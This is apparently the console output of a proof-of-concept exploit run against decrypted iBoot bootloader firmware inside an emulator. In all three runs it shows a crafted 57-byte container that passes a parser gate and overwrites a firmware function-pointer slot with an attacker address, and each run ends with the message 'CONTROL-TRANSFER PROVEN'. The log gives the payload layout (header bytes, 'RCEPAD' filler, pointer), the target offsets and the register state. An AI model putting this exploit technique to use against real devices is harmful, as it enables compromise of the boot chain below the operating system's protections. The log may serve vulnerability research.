[probe] full-file touch: faulted=0 sig=0 addr=0
[fw] /tmp/ds_iboot/iboot_dec.bin mapped at 0x104b9c000 size=3699832 rebase=0
== RCE: stored-block smash of REAL _DAT_003f6638 -> firmware blraaz ==

--- RCE run 1/3 ---
  geometry: slot=0x104f92638 (fw+3f6638) dst=0x104f92628 pad=16 payload=24 attacker=0x1005e4000
  stream: slen=29 body=24 [hdr 01 FFFF 0000 | 16B 'RCEPAD' filler | 8B ptr LE]
  container: phys_len=57 crc=1629ee75 cnt=1 declen0=29 blob_claim(w27)=29
  poc written: /tmp/ds_iboot/poc_rce.bin (57b)
  [1] gate FUN_0014b4b8 : ret=1 faulted=0 -> ACCEPT
  [2] disp FUN_001eb3c8 id=0x205: ret=24 faulted=0 (want 24) -> CLEAN-WRITE
      mem[slot-16 .. slot+24]:
        52434550414430315243455041443032
        00405e00010000000000000000000000
        0000000000000000
      slot _DAT_003f6638: before=0 after=1005e4000 == ATTACKER_ADDR (attacker=1005e4000)
      filler bytes @slot-16: VERIFIED ('RCEPAD' literal)
  [3] calling REAL FUN_001e5080(0,out): expect blraaz x8=attacker
      validator: ret=-9999 faulted=1 sig=5 pc=1005e4024 (pc_off=-73105372)
      regs@fault: x0=2 x1=104e412ef x2=1001140b4 x3=18d875a82 lr=104d81160
      marker page: tag=1337 (want 1337) x0=2 x1=104e412ef lr_off=1986912
      fw string @fw+2a52ef (x1 arg): '%s sysconfig is NULL.'
  VERDICT run1: PC-IN-ATTACKER-PAGE PC==CANARY_BRK CANARY-EXECUTED FW-ARGS-VISIBLE LR==IBOOT_RET_SITE
  >>> CONTROL-TRANSFER PROVEN (rep 1)

--- RCE run 2/3 ---
  geometry: slot=0x104f92638 (fw+3f6638) dst=0x104f92628 pad=16 payload=24 attacker=0x1005e4000
  stream: slen=29 body=24 [hdr 01 FFFF 0000 | 16B 'RCEPAD' filler | 8B ptr LE]
  container: phys_len=57 crc=1629ee75 cnt=1 declen0=29 blob_claim(w27)=29
  poc written: /tmp/ds_iboot/poc_rce.bin (57b)
  [1] gate FUN_0014b4b8 : ret=1 faulted=0 -> ACCEPT
  [2] disp FUN_001eb3c8 id=0x205: ret=24 faulted=0 (want 24) -> CLEAN-WRITE
      mem[slot-16 .. slot+24]:
        52434550414430315243455041443032
        00405e00010000000000000000000000
        0000000000000000
      slot _DAT_003f6638: before=0 after=1005e4000 == ATTACKER_ADDR (attacker=1005e4000)
      filler bytes @slot-16: VERIFIED ('RCEPAD' literal)
  [3] calling REAL FUN_001e5080(0,out): expect blraaz x8=attacker
      validator: ret=-9999 faulted=1 sig=5 pc=1005e4024 (pc_off=-73105372)
      regs@fault: x0=2 x1=104e412ef x2=1001140b4 x3=18d875a82 lr=104d81160
      marker page: tag=1337 (want 1337) x0=2 x1=104e412ef lr_off=1986912
      fw string @fw+2a52ef (x1 arg): '%s sysconfig is NULL.'
  VERDICT run2: PC-IN-ATTACKER-PAGE PC==CANARY_BRK CANARY-EXECUTED FW-ARGS-VISIBLE LR==IBOOT_RET_SITE
  >>> CONTROL-TRANSFER PROVEN (rep 2)

--- RCE run 3/3 ---
  geometry: slot=0x104f92638 (fw+3f6638) dst=0x104f92628 pad=16 payload=24 attacker=0x1005e4000
  stream: slen=29 body=24 [hdr 01 FFFF 0000 | 16B 'RCEPAD' filler | 8B ptr LE]
  container: phys_len=57 crc=1629ee75 cnt=1 declen0=29 blob_claim(w27)=29
  poc written: /tmp/ds_iboot/poc_rce.bin (57b)
  [1] gate FUN_0014b4b8 : ret=1 faulted=0 -> ACCEPT
  [2] disp FUN_001eb3c8 id=0x205: ret=24 faulted=0 (want 24) -> CLEAN-WRITE
      mem[slot-16 .. slot+24]:
        52434550414430315243455041443032
        00405e00010000000000000000000000
        0000000000000000
      slot _DAT_003f6638: before=0 after=1005e4000 == ATTACKER_ADDR (attacker=1005e4000)
      filler bytes @slot-16: VERIFIED ('RCEPAD' literal)
  [3] calling REAL FUN_001e5080(0,out): expect blraaz x8=attacker
      validator: ret=-9999 faulted=1 sig=5 pc=1005e4024 (pc_off=-73105372)
      regs@fault: x0=2 x1=104e412ef x2=1001140b4 x3=18d875a82 lr=104d81160
      marker page: tag=1337 (want 1337) x0=2 x1=104e412ef lr_off=1986912
      fw string @fw+2a52ef (x1 arg): '%s sysconfig is NULL.'
  VERDICT run3: PC-IN-ATTACKER-PAGE PC==CANARY_BRK CANARY-EXECUTED FW-ARGS-VISIBLE LR==IBOOT_RET_SITE
  >>> CONTROL-TRANSFER PROVEN (rep 3)

== RCE demo complete (3 deterministic runs expected above) ==
